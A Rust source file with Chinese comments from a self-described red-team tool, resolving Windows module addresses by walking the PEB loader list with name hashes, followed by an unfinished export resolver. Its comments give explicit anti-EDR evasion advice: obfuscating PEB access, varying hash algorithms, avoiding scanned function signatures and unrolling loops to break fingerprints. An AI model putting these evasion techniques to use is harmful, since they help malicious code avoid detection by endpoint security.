// 禁用#[derive(Debug)]
// 禁用result<>,改用option<*mut c_void>

// 指令混淆优化 (Anti-EDR)
//   EDR 经常通过扫描 NtCurrentPeb (其内部是 mov rax, gs:[60h]) 及其后的
//   Ldr 访问模式来定位“手动模块解析”行为。
//   优化建议： 可以在访问 Ldr 时加入微小的指针运算混淆，或者使用
//   core::ptr::read_volatile 防止编译器生成过于规律的汇编模式。


// 哈希函数的多样化： 不要只传一个固定的
//       hash_func。可以考虑在调用处根据不同的模块使用不同的哈希算法（例如
//       ：找 ntdll 用 fnv1a，找 kernel32 用 murmur3），这会让你的行为在
//       EDR 的启发式分析中显得极其混乱，难以定性。
//    2. 不使用 `is_null()`： 在极其严苛的免杀场景下，可以使用 (ptr as
//       usize) == 0 来代替
//       ptr.is_null()。虽然语义相同，但有时能避开某些针对 Rust
//       标准库特定函数签名的扫描。
//    3. 循环展开 (Loop Unrolling)： 如果你知道目标 DLL
//       通常在链表的前几个位置，可以尝试手动展开前两次循环。这会打破常见的
//       “遍历链表”指令序列指纹。

// 为了在项目中使用 debug_log! 宏，你需要在 src/macros.rs
//   文件中添加该宏的定义。

//   由于这是一个红队工具项目（Red
//   Ops），通常希望调试信息只在开发阶段（Debug
//   模式）显示，而在正式发布（Release
//   模式）时自动消失，以减小体积并提高隐蔽性。

//   1. 修改 src/macros.rs
//   在文件末尾添加以下内容：

//     1 /// 仅在 Debug 模式下向 Windows 控制台打印调试信息。
//     2 /// 在 Release 模式下，该宏的内容会被编译器忽略，不占用空间。
//     3 #[macro_export]
//     4 macro_rules! debug_log {
//     5     ($($arg:tt)*) => {
//     6         #[cfg(debug_assertions)]
//     7         {
//     8             $crate::println!($($arg)*);
//     9         }
//    10     };
//    11 }
//    12
//    13 /// 为了兼容文档中的示例，建议同时增加 eprintln! 的定义
//    14 #[macro_export]
//    15 macro_rules! eprintln {
//    16     ($($arg:tt)*) => {
//    17         $crate::println!($($arg)*);
//    18     };
//    19 }

//   2. 为什么这样设计？
//    * `#[cfg(debug_assertions)]`: 这是 Rust 的内置属性。当你运行 cargo
//      run 或 cargo build 时，宏会生效；当你使用 cargo build --release
//      时，整个代码块会被剔除。
//    * `$crate::println!`: 它复用了你项目中已经实现的 println!
//      宏逻辑（通过 ConsoleWriter 调用 Windows API）。
//    * `#[macro_export]`: 确保该宏在整个 crate 以及外部都可以通过
//      crate::debug_log! 或直接 debug_log! 访问。

//   3. 在代码中使用
//   修改完成后，你就可以像之前设想的那样在 src/module.rs
//   或其他地方安全地使用了：

//    1 if addr.is_null() {
//    2     debug_log!("[-] 模块 hash 匹配失败，未找到地址");
//    3     None
//    4 } else {
//    5     debug_log!("[+] 成功获取模块地址: {:?}", addr);
//    6     Some(addr)
//    7 }

//   提示：如果你发现报错 cannot find macro println in this scope，请确保在
//   src/macros.rs 中 println! 的定义位于 debug_log! 之前（Rust
//   宏的定义是有顺序要求的）。从你之前提供的文件内容看，顺序已经是正确的。
use core::{
    ffi::{c_void},
    ptr::null_mut,
    slice::from_raw_parts,
};

use crate::helper::PE;
use crate::types::{HMODULE, LDR_DATA_TABLE_ENTRY};
use crate::winapis::NtCurrentPeb;
use spin::Once;

type hash_type = Option<u32>;

/// crate a static variable to store the ntall.dll's address
///
///
static NTD: Once<u64> = Once::new();


/// 获取模块基址
///
///
/// 使用Option(定义在core中)不需要引入std
/// 
/// 已经对返回的指针是否可用做检查且有对应的debug时提示(release会删掉),但是不能保证指针指向的内容一定是PE结构中对应的字段
#[inline(always)]
pub fn retrieve_moudle_add(
    module: hash_type, // 传入对应的模块的hash值
    hash_func: Option<fn(&[u16]) -> u32>,
) -> Option<HMODULE>

{
    // 成功会返回u32类型的hash值,并赋值给左侧的hash变量
    // 失败会返回None,并退出retrieve_moudle_add
    // 需要增加debug时的错误提示,使用debug_log!
    let hash = hash_func?;

    
    unsafe {
        let peb = NtCurrentPeb();
        let ldr = (*peb).Ldr;

        let mut InMemoryOrderModuleList_flink = (*ldr).InMemoryOrderModuleList.Flink;
        let mut InMemoryOrderModuleList_flink_LDR_DATA_TABLE_ENTRY =
            (*ldr).InMemoryOrderModuleList.Flink as *const LDR_DATA_TABLE_ENTRY;

        // 处理传入的module是None的情况
        let module=match module {
            Some(h)=>h,
            // 需要增加debug时的错误提示,使用debug_log!
            // 需要对这种条件下的返回值(*peb).ImageBaseAddress做is_null()判定,排除极端环境(peb破坏)返回some(0x0)的情况,这时候依然会出现错误
            None=>{
                if (*peb).ImageBaseAddress.is_null(){
                    // debug_log!("[-] ImageBaseAddress is NULL");
                    return None; 
                }
                // debug_log!("[+] Returning ImageBaseAddress: {:?}", base);
                return Some((*peb).ImageBaseAddress);
            }
        };
            

        let head_node = InMemoryOrderModuleList_flink;
        let mut addr = null_mut();

        while !(*InMemoryOrderModuleList_flink_LDR_DATA_TABLE_ENTRY)
            .FullDllName
            .Buffer
            // 检查原始类型的指针本身的地址是否为一个有效的内存地址(is null,指针本身为空,代表指针不可用),不是检查指针指向的内容为空(指针指向的内容为空,比如全是0时,通常指针本身不是空的)
            .is_null()
        {
            if (*InMemoryOrderModuleList_flink_LDR_DATA_TABLE_ENTRY)
                .FullDllName
                .Length
                != 0
            {
                let buffer = from_raw_parts(
                    (*InMemoryOrderModuleList_flink_LDR_DATA_TABLE_ENTRY)
                        .FullDllName
                        .Buffer,
                    ((*InMemoryOrderModuleList_flink_LDR_DATA_TABLE_ENTRY)
                        .FullDllName
                        .Length
                        / 2) as usize,
                );

                if module== hash(buffer) {
                    addr = (*InMemoryOrderModuleList_flink_LDR_DATA_TABLE_ENTRY).Reserved2[0];
                    // 需要增加debug时的成功的提示,使用debug_log!
                    break;
                }
            }
            InMemoryOrderModuleList_flink = (*InMemoryOrderModuleList_flink).Flink;

            if InMemoryOrderModuleList_flink == head_node {
                // 需要增加debug时的错误提示,使用debug_log!
                break;
            }

            InMemoryOrderModuleList_flink_LDR_DATA_TABLE_ENTRY =
                InMemoryOrderModuleList_flink as *const LDR_DATA_TABLE_ENTRY
        }

        // 这里对返回的addr做了 is_null判定(确保指针本身的地址有效),但有极低的风险导致数据竞争
        if addr.is_null() { None } else { Some(addr) }
    }
}

// 与dinvk的原代码对比,重写及删除部分是否更优?
pub fn get_proc_address(
    h_moudle: Option<HMODULE>,
    function: hash_type,
    hash_func: Option<fn(&[u16]) -> u32>,
) -> Option<*mut c_void> {
    // 使用? ,当Some会解出里面的内容并向左赋值,None会直接让整个 get_proc_address 函数返回None
    let h_moudle_base = h_moudle?;

    // initializes a new pe struct
    let pe = PE::parse(h_moudle_base);
    unsafe {
        // 这里的zip逻辑会在后续实现中完善
        // let Some((nt_header,export_dir))=pe.nt_header().zip(pe.exports)
    }

    todo!()
}
